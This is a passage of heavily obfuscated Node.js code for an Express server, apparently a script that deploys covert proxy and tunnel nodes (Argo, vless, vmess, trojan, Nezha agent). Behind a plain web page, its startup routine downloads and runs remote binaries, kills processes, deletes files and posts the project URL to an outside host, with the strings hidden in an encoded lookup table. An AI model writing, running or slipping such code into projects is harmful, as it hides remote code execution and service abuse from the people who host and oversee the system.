_0x5f1e97=await axios[_0x5b21ca(0x130)]('https://oo'+'oo.serv00.'+_0x5b21ca(0x103)+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':'applicatio'+'n/json'}});return console[_0x5b21ca(0x1a6)](_0x5b21ca(0x138)+_0x5b21ca(0x19c)+_0x5b21ca(0x14c)+'ccessfully'),_0x5f1e97;}catch(_0x19e4e4){return console['error']('Add\x20automa'+_0x5b21ca(0x1d4)+_0x5b21ca(0x231)+'d:\x20'+_0x19e4e4['message']),null;}}async function startserver(){const _0xa7d25d=_0x156850;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5cf3b5){console[_0xa7d25d(0x210)](_0xa7d25d(0x11f)+_0xa7d25d(0x1d1)+':',_0x5cf3b5);}}function _0x2da6(_0x580d83,_0x26c6a6){const _0x366276=_0x3662();return _0x2da6=function(_0x2da67c,_0x1343ca){_0x2da67c=_0x2da67c-0x100;let _0x5ce48a=_0x366276[_0x2da67c];return _0x5ce48a;},_0x2da6(_0x580d83,_0x26c6a6);}function _0x3662(){const _0x38c124=['pipe','/trojan-ar','split','3Fed%3D256','pty,skip\x20r','http://ip-','for\x20using\x20','host=','Error\x20read','%3Fed%3D25','readFileSy','listen','for\x20','999448JgGuCj','n\x20connect\x20','://localho','amd','firefox','orce_updat','\x20successfu','win32','fileUrl','arch','/null\x202>&1','nt:\x20true\x0as','error','/sub.txt\x20s','\x20info\x20--ur','yc.mn/web','/dev/null','rojan-argo','se_ipv6_co','Error\x20exec','success','axios','60#','to\x20tunnel','Mozilla/5.','ess','m64.ssss.n','tls','\x202>&1','arm64','yc.mn/agen','\x0avless://','otocol\x20htt','Can\x27t\x20find','You\x20can\x20ac','\x0atls:\x20','lowkev.kev','ble\x20is\x20emp','--loglevel','NEZHA\x20vari','g\x20error:\x20','utf-8','20puXzoS','existsSync','base64','\x20task\x20fail','UUID','mismatch\x20T','o?ed=2560','l://8.8.8.','dding\x20auto','\x20failed:\x20','applicatio','4c0efc','l\x202>&1\x20&','php\x20runnin','tcp','on\x20uploade','\x0a\x20\x20\x20\x20','50czeXSA','send','CFPORT','se\x0agpu:\x20fa','N\x20or\x20ARGO_','express','\x20-c\x20','l:\x20http2\x0a\x20','Download\x20','https+loca','filter','direct','promises','FILE_PATH','our\x20nodes!','816nDBSTq','noTLSVerif','8443','get',',\x20re-runni','p2\x20run\x20--t','ARGO_AUTH','vision','sni=','&fp=firefo','pdate\x20--pr','loww6','le\x20','NAME','\x20-p\x20','\x0a\x20\x20\x20\x20\x20\x20ori','net/add-ur','AUTO_ACCES','length','e\x0atemperat','RJdE9EbGla','aarch64','f\x20/im\x20','aved\x20succe','\x20\x20-\x20servic','isp','xUZzBaVGd0','i.ip.sb/ge','npm\x20runnin','basename','tunnel\x20--e','unnelSecre','cret:\x20','rocs\x20>/dev','unlink','n=none&sec','matic\x20acce','ARGO_AUTH\x20','ee1-b8cf7e','les:','261-44bb-b','xists','TunnelSecr','e:\x20http_st','Error\x20in\x20s','/config.ya','1395747KiGEhw','ssfully','ecture','quic','tls&sni=','yc.mn/bot','UzAwTlRBeU','lly','forEach','arm','\x20\x0a\x20\x20ingres','Skipping\x20a','index.html','2096','\x20-c\x20\x22','post','\x0a\x20\x20protoco','re_tls:\x20tr','zbb','PROJECT_UR','api.com/js','443','/vless-arg','automatic\x20','4\x0aserver:\x20',':\x0a\x20\x20\x20\x20\x20\x20\x20\x20','\x0a\x20\x20credent','config.yam','\x0a\x0avmess://','readdirSyn','mmand_exec','e_auto_upd','statSync','n/json','NEZHA_KEY','child_proc','random','2053','d\x20successf','VmlZV0V3Tl','status','QtNDEyNmY4','ArgoDomain','k\x20added\x20su','oip','writeFileS','less-argo%','822gQIUsi','st:','kip_procs_','urity=tls&',':\x20false\x0auu','AUTH\x20varia','cess\x20/{SUB','match','none','and:\x20','yc.mn/v1','this\x20scrip','\x20-s\x20','_to_upgrad','catch','y:\x20true\x0a\x20\x20','disable_co','oDomain','unning','UPLOAD_URL','Content-Ty','SUB_PATH','Hello\x20worl','toString','p2\x20--logfi','dge-ip-ver','\x20>/dev/nul','\x201800\x0arepo','e:\x20false\x0au','\x20is\x20runnin','t\x20failed\x20f','l\x202>&1','push','response','7dIyMnE','YzIwOGEyYW','or\x20','uvwxyz','ty,\x20use\x20qu','org','charAt','blackhole','MtZGFjNS00','CFIP','http','block','data','ocalhost:','false','ostname:\x20','countryCod','saas.sin.f','message','Error\x20down','vless','2083','sable_nat:','stringify','t,\x20enjoy!','e:\x20true\x0adi','readFile','YWRlLTkyNm','unshift','able_send_','ials-file:','pkill\x20-f\x20\x22','uting\x20comm','eyJhIjoiOW','d64.ssss.n','unlinkSync','PORT','http\x20serve','all','id:\x20','text/plain','set','access\x20tas','sion\x20auto\x20','join','https://ar','l\x20http://l','utf8','includes','\x20>\x20nul\x202>&','obtain\x20Arg','n\x20--skip-p','log','og:','x&type=ws&','te\x20--repor','YTRlMjQ0Mj','?security=','ss\x20task','5.qzz.io','close','replace','.tmp','untry_code','env','https://am','Empowermen','1340082KtIYzD','Nodes\x20uplo','isFile','config.jso','nohup\x20','vmess','ng\x20bot\x20to\x20','\x0a\x20\x20\x20\x20\x20\x20ser','\x0adisable_f','1391889OOgMDu','ARGO_DOMAI',';\x20charset=','xtls-rprx-','error\x20in\x20s','\x20--disable','eStream','\x0askip_conn','\x22\x20>\x20/dev/n','App\x20is\x20run','atus:404\x0a\x20','sub.txt','ull\x202>&1\x20&','test','&path=%2Ft','pop','list.txt','r\x20is\x20runni','e-nodes','tartserver','?encryptio','from','tic\x20access','1194topLLf','country_co','del\x20/f\x20/q\x20','ate:\x20true\x0a','vice:\x20http','--tls','s:\x0a\x20\x20\x20\x20-\x20h','\x0a\x0atrojan:/','l\x20run','\x20is\x20create','taskkill\x20/','ml\x22\x20>/dev/','wicyI6Ik1E','auto','Thank\x20you\x20','\x20false\x0adis','ync','abcdefghij','boot.log','11208175AFqbzB','127.0.0.1','able\x20is\x20em','oken\x20','ODllZTU4Ii','--no-autou','clear','Subscripti','count:\x20tru','d!<br><br>','lse\x0adisabl','platform','SERVER_POR','8/dns-quer','ning'];_0x3662=function(){return _0x38c124;};return _0x3662();}startserver()['catch'](_0x2fc6e5=>{const _0xbb7cc0=_0x156850;console['error']('Unhandled\x20'+_0xbb7cc0(0x1c2)+_0xbb7cc0(0x1d1)+':',_0x2fc6e5);}),app[_0x156850(0x251)]('/',async function(_0x57539b,_0x2d0549){const _0x32cf23=_0x156850;try{const _0x4e08c7=path['join'](__dirname,_0x32cf23(0x12d)),_0xea7478=await fs[_0x32cf23(0x24b)][_0x32cf23(0x18c)](_0x4e08c7,_0x32cf23(0x1a1));_0x2d0549[_0x32cf23(0x240)](_0xea7478);}catch(_0x1fc471){_0x2d0549[_0x32cf23(0x240)](_0x32cf23(0x166)+_0x32cf23(0x1f1)+_0x32cf23(0x226)+_0x32cf23(0x156)+'_PATH}(Def'+'ault:\x20/sub'+')\x20to\x20get\x20y'+_0x32cf23(0x24d));}}),app[_0x156850(0x202)](PORT,()=>console[_0x156850(0x1a6)](_0x156850(0x197)+_0x156850(0x1cf)+'ng\x20on\x20port'+':'+PORT+'!'));
